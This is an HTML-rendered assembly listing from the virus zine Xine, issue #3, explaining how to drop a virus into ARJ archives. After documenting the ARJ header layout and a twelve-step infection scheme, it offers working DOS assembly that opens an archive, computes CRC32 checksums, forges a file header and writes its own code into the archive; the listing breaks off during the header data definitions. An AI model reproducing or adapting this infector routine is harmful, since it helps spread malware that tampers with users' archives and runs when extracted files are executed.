<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>alicia_arj.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                         /-----------------------------\
;                                         | Xine - issue #3 - Phile 109 |</span><span class="sc0">
</span><span class="sc1">;                                         \-----------------------------/</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                          Dropping over ARJ archives</span><span class="sc0">
</span><span class="sc1">;                       From the Archives infector series</span><span class="sc0">
</span><span class="sc1">;                            By UnknowN MnemoniK/iKx</span><span class="sc0">
</span><span class="sc1">;                 </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Introduction</span><span class="sc0">
</span><span class="sc1">;  +------------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Arj  aren't  too  comon like zip or rar files but they are sometimes used</span><span class="sc0">
</span><span class="sc1">;  for compressing something  like cracks and  put into games or stuff  like</span><span class="sc0">
</span><span class="sc1">;  that. Arjs are also quite  simple to infect because you need just to drop</span><span class="sc0">
</span><span class="sc1">;  an header and the virus .</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   On The ground</span><span class="sc0">
</span><span class="sc1">;  +-------------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  There are three types of packets , the comment packet and the file packet,</span><span class="sc0">
</span><span class="sc1">;  both use the same header , and the final  packet is just the ARJ signature</span><span class="sc0">
</span><span class="sc1">;  plus a word with value 0 , so if you want infect an ARJ file, how you will</span><span class="sc0">
</span><span class="sc1">;  process? simple as bonjour, you read the first header and put it somewhere</span><span class="sc0">
</span><span class="sc1">;  go  to the end-4 , calculate  crc , write the header , write the virus and</span><span class="sc0">
</span><span class="sc1">;  write the final packet , everything will be done allright</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Arj comment/file packet header type :</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; OFFSET LABEL       TYP  VALUE        DESCRIPTION</span><span class="sc0">
</span><span class="sc1">; ------ ----------- ---- ----------- ----------------------------------</span><span class="sc0">
</span><span class="sc1">; 00     ARJSIG      DW   EA60        Local File Header Signature</span><span class="sc0">
</span><span class="sc1">; 02     HEADERSIZE  DW   0000        Header size , variable</span><span class="sc0">
</span><span class="sc1">; 04     INTERNSIZE  DB   00          Size between here and host data</span><span class="sc0">
</span><span class="sc1">; 05     VERSIONBY   DB   00          Version made by</span><span class="sc0">
</span><span class="sc1">; 06     VERSIONMIN  DB   00          Minimum version need to extract</span><span class="sc0">
</span><span class="sc1">; 07     HOSTOS      DB   00          Host operating system</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;        value: 0 = MSDOS        3 = AMIGA       6 = APPLE GS    9 = VAX VMS</span><span class="sc0">
</span><span class="sc1">;               1 = PRIMOS       4 = MAC-OS      7 = ATARI ST</span><span class="sc0">
</span><span class="sc1">;               2 = UNIX         5 = OS/2        8 = NEXT</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 08     FLAGS       DB   00          Flags</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;        Value: 1 = GARBLED_FLAG</span><span class="sc0">
</span><span class="sc1">;               2 = NOT USED</span><span class="sc0">
</span><span class="sc1">;               4 = VOLUME_FLAG</span><span class="sc0">
</span><span class="sc1">;               8 = EXTFILE_FLAG</span><span class="sc0">
</span><span class="sc1">;               10h = PATHSYM_FLAG</span><span class="sc0">
</span><span class="sc1">;               20h = BACKUP_FLAG</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 09     CMPMETHOD   DB   00          Compression method</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Value: 0 = STORED                       1 = MOST COMPRESSED</span><span class="sc0">
</span><span class="sc1">;                2 = MIDDLE PLUS COMPRESSED       3 =MIDDLE FAST COMPRESSION</span><span class="sc0">
</span><span class="sc1">;                4 = FASTEST COMPRESSED</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 0A     FILETYPE    DB   00          Type of the file</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Value: 0 = BINARY       1 = 7-BIT TEXT</span><span class="sc0">
</span><span class="sc1">;                3 = DIRECTORY    4 = VOLUMELABEL</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 0B     RESERVED    DB   'Z'         always 'Z' (not sure)</span><span class="sc0">
</span><span class="sc1">; 0C     DOSTIME     DW   0000        Time of creation of the file,Dos style</span><span class="sc0">
</span><span class="sc1">; 0E     DOSDATE     DW   0000        Date of creation of the file,Dos style</span><span class="sc0">
</span><span class="sc1">; 10     COMPRESSIZ  HEX  00000000    Compressed size    </span><span class="sc0">
</span><span class="sc1">; 14     ORIGSIZ     HEX  00000000    Uncompressed size</span><span class="sc0">
</span><span class="sc1">; 18     CRC32       HEX  00000000    The CRC32 of compressed datas</span><span class="sc0">
</span><span class="sc1">; 1C     FILENAME    DS   ?           Filename with Null-End</span><span class="sc0">
</span><span class="sc1">; ??     COMMENT     DS   ?           Comment with Null-End</span><span class="sc0">
</span><span class="sc1">; ??     HEADCRC32   HEX  00000000    CRC32 of the header</span><span class="sc0">
</span><span class="sc1">; ??     EXTENDHEAD  DW   0           Extended Header - Unused</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Arj have the particularity ( and RAR ) to need an header CRC , you render </span><span class="sc0">
</span><span class="sc1">;  CRC32 from Internal Header to Host Datas</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Infection Step by Step</span><span class="sc0">
</span><span class="sc1">;  +----------------------+ </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  For  the  infection , you  must fix  a variable version need , make , and</span><span class="sc0">
</span><span class="sc1">;  minimum, plus also fix the MSDOS in Hostos , and set flags to path symbol</span><span class="sc0">
</span><span class="sc1">;  When done , you can proceed to the infection scheme</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  1ø Open Arj file</span><span class="sc0">
</span><span class="sc1">;  2ø Read first header and put it somewhere for our virus</span><span class="sc0">
</span><span class="sc1">;  3ø Verify if it's really an arj </span><span class="sc0">
</span><span class="sc1">;  4ø check if we are already installed</span><span class="sc0">
</span><span class="sc1">;  5ø put ArjCrc32 the CRC of our virus</span><span class="sc0">
</span><span class="sc1">;  6ø put in HeaderCrc the CRC of the header</span><span class="sc0">
</span><span class="sc1">;  7ø Update Header ( Filename , Extended , comment size , etc etc... )</span><span class="sc0">
</span><span class="sc1">;  8ø Go to the end-4 </span><span class="sc0">
</span><span class="sc1">;  9ø Write the header</span><span class="sc0">
</span><span class="sc1">;  10ø Write the virus</span><span class="sc0">
</span><span class="sc1">;  11ø Write final packet</span><span class="sc0">
</span><span class="sc1">;  12ø All done !</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Improvements of this method are welcome</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Usefull code</span><span class="sc0">
</span><span class="sc1">;  +------------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  You want a code that work ? get it!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                                    </span><span class="sc1">; open the file who is placed</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">arjname</span><span class="sc0">                           </span><span class="sc1">; in arjname</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                      </span><span class="sc1">; exchange handle</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                                    </span><span class="sc1">; go to the end</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                      </span><span class="sc1">; sub cx/dx(32 bits) 4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                                    </span><span class="sc1">; go there</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                                </span><span class="sc1">; render CRC of this code</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Crc_calc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArjCrc32</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArjCrc32</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                      </span><span class="sc1">; read the first part</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SecondSide</span><span class="sc4">-</span><span class="sc5">Header</span><span class="sc0">                 </span><span class="sc1">; of the header</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ArjHeaderCrc</span><span class="sc4">-</span><span class="sc5">ArjHsmsize</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ArjHsmSize</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Crc_calc</span><span class="sc0">                                   </span><span class="sc1">; render CRC of the header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArjHeaderCrc</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArjHeaderCrc</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                      </span><span class="sc1">; write second part of the</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">FinSide</span><span class="sc4">-</span><span class="sc5">SecondSide</span><span class="sc0">                       </span><span class="sc1">; header</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SecondSide</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArjHeaderCrc</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; clean all saved crc</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArjHeaderCrc</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArjCrc32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; to have a cleaned code</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArjCrc32</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                                </span><span class="sc1">; write the virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArjHeadSiz</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;set at ARjHeadS signature+w0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                      </span><span class="sc1">; write the end packet</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                                      </span><span class="sc1">; close the file</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">                                             </span><span class="sc1">; bye!</span><span class="sc0">

</span><span class="sc5">crc_calc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_table</span><span class="sc0">              </span><span class="sc1">; render crc table</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">Crc_loop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Crc_loop</span><span class="sc0">

</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">crc_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">starttable</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; the buffer table</span><span class="sc0">
                    </span><span class="sc1">; remember : It begin by the end</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">               </span><span class="sc1">; set bp equal 255 </span><span class="sc0">
                    </span><span class="sc1">; 255 * 4 = 1024</span><span class="sc0">
</span><span class="sc6">std</span><span class="sc0">                 </span><span class="sc1">; set Direction Flag On</span><span class="sc0">
                    
</span><span class="sc5">TableHighloop</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; the major loop in the Crc table Calc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">; set the minus loop to 8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; dx = bp , major counter loop</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; ax = zero</span><span class="sc0">

</span><span class="sc5">TableLowLoop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; mov one byte of ax at right in bin</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; if anything losted , put it on dx</span><span class="sc0">

</span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">anomality</span><span class="sc0">            </span><span class="sc1">; if superior or equal skip encrypt.</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">            </span><span class="sc1">; encrypt value by a signature</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">anomality</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">TableLowLoop</span><span class="sc0">         </span><span class="sc1">; make it 8 times</span><span class="sc0">

</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; write ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; not write dx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; decrement the counter</span><span class="sc0">

</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">TableHighLoop</span><span class="sc0">           </span><span class="sc1">; repeat it until bp = 0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; last value equal 0</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                 </span><span class="sc1">; clear direction flag          </span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">arjname</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'test.arj'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Header</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ArjSig</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc0">         </span><span class="sc1">; Arj signature</span><span class="sc0">
</span><span class="sc5">ArjHeadsiz</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">              </span><span class="sc1">; Header size </span><span class="sc0">
</span><span class="sc5">ArjHSmsize</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">              </span><span class="sc1">; Internal header size</span><span class="sc0">
</span><span class="sc5">ArjVer</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">              </span><span class="sc1">; Ver made by</span><span class="sc0">
</span><span class="sc5">ArjMin</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">              </span><span class="sc1">; Minimum version to extract</span><span class="sc0">
</span><span class="sc5">ArjHost</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">               </span><span class="sc1">; Host Operating System</span><span class="sc0">
</span><span class="sc5">ArjFlags</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">              </span><span class="sc1">; Flags = path translated</span><span class="sc0">
</span><span class="sc5">ArjMethod</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">               </span><span class="sc1">; Method = 0 = stored</span><span class="sc0">
</span><span class="sc5">ArjFiletype</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">               </span><span class="sc1">; File type = 0 = binary</span><span class="sc0">
</span><span class="sc5">ArjReserved</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">              </span><span class="sc1">; reserved ***</span><span class="sc0">
</span><span class="sc5">ArjFileTime</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc2">078h</span><span class="sc0">            </span><span class="sc1">; Time </span><span class="sc0">
</span><span class="sc5">ArjFileDate</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc2">024h</span><span class="sc0">            </span><span class="sc1">; Date</span><span class="sc0">
</span><span class="sc5">ArjCompress</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">            </span><span class="sc1">; size compressed = uncompress.</span><span class="sc0">
</span><span class="sc5">ArjOriginal</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">            </span><span class="sc1">; size uncompressed = compress.</span><span class="sc0">
</span><span class="sc5">ArjCrc32</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; Crc of The file</span><span class="sc0">
